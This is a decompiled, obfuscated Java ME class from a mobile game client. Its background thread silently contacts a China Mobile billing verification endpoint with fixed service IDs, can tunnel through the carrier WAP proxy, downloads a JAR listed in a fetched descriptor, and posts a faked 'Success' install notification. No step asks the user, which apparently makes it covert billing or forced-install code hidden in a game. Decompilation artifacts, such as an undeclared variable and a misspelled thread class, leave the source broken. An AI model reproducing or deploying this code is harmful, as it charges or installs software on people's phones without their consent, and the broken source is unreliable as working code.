import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import javax.microedition.io.Connection;
import javax.microedition.io.Connector;
import javax.microedition.io.ContentConnection;
import javax.microedition.io.HttpConnection;
import javax.microedition.io.InputConnection;
import javax.microedition.io.OutputConnection;
import kava.lang.Threak;

public class a2
  implements Runnable
{
  public boolean a = false;
  y jdField_if = null;
  private int jdField_try = -1;
  private boolean jdField_new;
  private static final String jdField_int = "NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1";
  private static final String jdField_do = "http://gmp.i139.cn/bizcontrol/ControlVerify?sender=202&channelId=15083000&cpId=C00083&cpServiceId=120121814000";
  private String jdField_byte = "ready...";
  private static final String jdField_for = "http://10.0.0.172:80/";
  
  public a2(boolean paramBoolean, y paramy)
  {
    this.jdField_new = paramBoolean;
    this.jdField_if = paramy;
  }
  
  public void jdMethod_if()
  {
    Threak localThreak = new Threak(this);
    try
    {
      localThreak.start();
    }
    catch (Exception localException) {}
  }
  
  public void jdMethod_do() {}
  
  public void run()
  {
    try
    {
      a();
    }
    catch (Exception localException)
    {
      System.err.println(localException.toString());
    }
  }
  
  private void a()
    throws IOException
  {
    boolean bool = true;
    String str1 = "";
    String str2 = "";
    String str3 = "";
    HttpConnection localHttpConnection = null;
    try
    {
      localHttpConnection = jdMethod_if(localHttpConnection, "GET", "http://gmp.i139.cn/bizcontrol/ControlVerify?sender=202&channelId=15083000&cpId=C00083&cpServiceId=120121814000");
      this.jdField_byte = "connecting...";
      localHttpConnection = jdMethod_if(localHttpConnection, "GET", "http://gamepie.g188.net/gamecms/wap/game/wyinfo/3638");
      this.jdField_byte = "connecting...";
      this.jdField_byte = "getting jad...";
      localHttpConnection = jdMethod_do(localHttpConnection, "GET", "http://gmp.i139.cn/bizcontrol/ControlVerify?sender=202&channelId=15083000&cpId=C00083&cpServiceId=120121814000");
      if ((bool == true) && (this.jdField_try == 200))
      {
        String str4 = a(localHttpConnection);
        str1 = a(str4, "MIDlet-Jar-URL: ");
        str2 = a(str4, "MIDlet-Install-Notify: ");
      }
      else
      {
        this.jdField_byte = ("getting jad fail.(" + this.jdField_try + ")");
        bool = false;
      }
      if ((bool == true) && (!str1.equals("")))
      {
        this.jdField_byte = "downloading jar...";
        localHttpConnection = jdMethod_do(localHttpConnection, "GET", str1);
        if (this.jdField_try != 200)
        {
          this.jdField_byte = ("downloading jar fail.(" + this.jdField_try + ")");
          bool = false;
        }
      }
      else
      {
        bool = false;
      }
      if ((bool == true) && (!str2.equals("")))
      {
        this.jdField_byte = "notifying...";
        localHttpConnection = a(localHttpConnection, "POST", str2);
        if (this.jdField_try != 200)
        {
          this.jdField_byte = ("notifying fail.(" + this.jdField_try + ")");
          bool = false;
        }
      }
      else
      {
        bool = false;
      }
      this.a = bool;
      return;
    }
    catch (IOException localIOException)
    {
      this.a = false;
      this.jdField_byte = localIOException.toString();
    }
    finally
    {
      this.jdField_if.jdMethod_for();
      if (localHttpConnection != null) {
        try
        {
          localHttpConnection.close();
        }
        catch (Exception localException3) {}
      }
    }
  }
  
  private HttpConnection jdMethod_if(HttpConnection paramHttpConnection, String paramString1, String paramString2)
    throws IOException
  {
    if (this.jdField_new)
    {
      paramHttpConnection = (HttpConnection)Connector.open("http://10.0.0.172:80/" + jdMethod_if(paramString2), 3, true);
      paramHttpConnection.setRequestProperty("X-Online-Host", a(paramString2));
    }
    else
    {
      paramHttpConnection = (HttpConnection)Connector.open(paramString2, 3, true);
    }
    paramHttpConnection.setRequestMethod(paramString1);
    paramHttpConnection.setRequestProperty("Content-Type", "text/plain");
    paramHttpConnection.setRequestProperty("Connection", "close");
    paramHttpConnection.setRequestProperty("User-Agent", System.getProperty("microedition.platform"));
    paramHttpConnection.setRequestProperty("accept", "text/html,text/css,multipart/mixed,application/java-archive, application/java, application/x-java-archive, text/vnd.sun.j2me.app-descriptor, application/vnd.oma.drm.message, application/vnd.oma.drm.content, application/vnd.oma.dd+xml, application/vnd.oma.drm.rights+xml, application/vnd.oma.drm.rights+wbxml, application/x-nokia-widget, */*");
    this.jdField_try = paramHttpConnection.getResponseCode();
    return paramHttpConnection;
  }
  
  private HttpConnection a(HttpConnection paramHttpConnection, String paramString1, String paramString2)
    throws IOException
  {
    if (this.jdField_new)
    {
      paramHttpConnection = (HttpConnection)Connector.open("http://10.0.0.172:80/" + jdMethod_if(paramString2), 3, true);
      paramHttpConnection.setRequestProperty("X-Online-Host", a(paramString2));
    }
    else
    {
      paramHttpConnection = (HttpConnection)Connector.open(paramString2, 3, true);
    }
    byte[] arrayOfByte = (a.G + "Success").getBytes();
    paramHttpConnection.setRequestMethod(paramString1);
    paramHttpConnection.setRequestProperty("Content-Type", "text/plain");
    paramHttpConnection.setRequestProperty("Connection", "close");
    paramHttpConnection.setRequestProperty("User-Agent", System.getProperty("microedition.platform"));
    paramHttpConnection.setRequestProperty("content-length", "" + arrayOfByte.length);
    OutputStream localOutputStream;
    (localOutputStream = paramHttpConnection.openOutputStream()).write(arrayOfByte);
    localOutputStream.close();
    this.jdField_try = paramHttpConnection.getResponseCode();
    return paramHttpConnection;
  }
  
  private HttpConnection jdMethod_do(HttpConnection paramHttpConnection, String paramString1, String paramString2)
    throws IOException
  {
    for (;;)
    {
      paramHttpConnection = jdMethod_if(paramHttpConnection, paramString1, paramString2);
      if ((this.jdField_try != 307) && (this.jdField_try != 302) && (this.jdField_try != 301)) {
        break;
      }
      paramString2 = paramHttpConnection.getHeaderField("location");
    }
    return paramHttpConnection;
  }
  
  private void jdMethod_if(HttpConnection paramHttpConnection)
    throws IOException
  {
    InputStream localInputStream = null;
    try
    {
      localInputStream = paramHttpConnection.openInputStream();
      ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
      byte[] arrayOfByte = new byte['Ѐ'];
      int i;
      while (-1 != (i = localInputStream.read(arrayOfByte))) {
        localByteArrayOutputStream.write(arrayOfByte, 0, i);
      }
      localByteArrayOutputStream.close();
      return;
    }
    catch (IOException localIOException) {}finally
    {
      if (localInputStream != null) {
        try
        {
          localInputStream.close();
        }
        catch (Exception localException3) {}
      }
    }
  }
  
  private String a(HttpConnection paramHttpConnection)
    throws IOException
  {
    str = "";
    InputStream localInputStream = null;
    try
    {
      localInputStream = paramHttpConnection.openInputStream();
      int i = (int)paramHttpConnection.getLength();
      ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
      int j;
      while ((j = localInputStream.read()) != -1) {
        localByteArrayOutputStream.write(j);
      }
      str = new String(localByteArrayOutputStream.toByteArray());
      localByteArrayOutputStream.close();
      return str;
    }
    catch (IOException localIOException)
    {
      this.jdField_byte = localIOException.toString();
    }
    finally
    {
      if (localInputStream != null) {
        try
        {
          localInputStream.close();
        }
        catch (Exception localException3) {}
      }
    }
  }
  
  private String jdMethod_do(String paramString1, String paramString2)
  {
    if ((paramString1 != null) && (!paramString1.equals("")) && (paramString2 != null) && (!paramString2.equals(""))) {
      return "http://" + paramString1 + "/" + paramString2;
    }
    return "";
  }
  
  private String a(String paramString)
  {
    if ((paramString != null) && (!paramString.equals("")))
    {
      int i = paramString.lastIndexOf('/');
      return paramString.substring(7, i);
    }
    return "";
  }
  
  private String jdMethod_if(String paramString)
  {
    if ((paramString != null) && (!paramString.equals("")))
    {
      int i = paramString.lastIndexOf('/');
      return paramString.substring(i + 1);
    }
    return "";
  }
  
  private String a(String paramString1, String paramString2)
  {
    if ((paramString1 != null) && (!paramString1.equals("")) && (paramString2 != null) && (!paramString2.equals("")))
    {
      String str = "";
      int i = paramString1.indexOf(paramString2);
      str = paramString1.substring(i + paramString2.length());
      i = str.indexOf("\n");
      if (i != -1) {
        str = str.substring(0, i);
      }
      i = str.indexOf("\r");
      if (i != -1) {
        str = str.substring(0, i);
      }
      return str;
    }
    return "";
  }
  
  private String jdMethod_if(String paramString1, String paramString2)
  {
    if ((paramString1 != null) && (!paramString1.equals("")) && (paramString2 != null) && (!paramString2.equals("")))
    {
      String str = "";
      int i = paramString1.indexOf("<" + paramString2 + ">");
      str = paramString1.substring(i + ("<" + paramString2 + ">").length());
      i = str.indexOf("</" + paramString2 + ">");
      str = str.substring(0, i);
      return str;
    }
    return "";
  }
}


/* Location:              D:\OneDrive\游戏\客户端SOT觉醒者 - 副本.jar!\a2.class
 * Java compiler version: 1 (45.3)
 * JD-Core Version:       0.7.1
 */